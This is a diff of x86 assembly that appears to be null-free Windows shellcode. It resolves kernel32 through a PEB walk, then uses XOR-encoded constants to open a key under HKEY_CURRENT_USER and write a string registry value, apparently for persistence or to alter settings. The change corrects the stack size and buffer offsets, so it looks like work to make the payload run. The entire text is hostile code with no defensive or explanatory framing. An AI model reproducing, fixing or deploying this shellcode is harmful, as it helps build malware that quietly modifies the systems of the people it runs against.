@@ -120,7 +120,7 @@ main:
     mov  ebp, esp
     xor  ecx, ecx
     mov  ecx, 0x01010301
-    xor  ecx, 0x01010201
+    xor  ecx, 0x01010101
     sub  esp, ecx
 
     ; Bootstrap: find kernel32 via PEB walk
@@ -261,7 +261,7 @@ wf_entry:
     push eax                      ; samDesired
     xor  eax, eax
     push eax                      ; ulOptions
-    lea  eax, [ebp-0xb0]
+    lea  eax, [ebp-0x130]
     push eax                      ; lpSubKey
     mov  eax, 0x81010103
     xor  eax, 0x01010102
@@ -280,14 +280,14 @@ wf_set_value:
     mov  eax, 0x0101010e
     xor  eax, 0x01010102
     push eax                      ; cbData
-    lea  eax, [ebp-0xc8]
+    lea  eax, [ebp-0x148]
     push eax                      ; lpData
     mov  eax, 0x01010103
     xor  eax, 0x01010102
     push eax                      ; dwType
     xor  eax, eax
     push eax                      ; Reserved
-    lea  eax, [ebp-0xbc]
+    lea  eax, [ebp-0x13c]
     push eax                      ; lpValueName
     mov  eax, [ebp-0x3c]
     push eax                      ; hKey
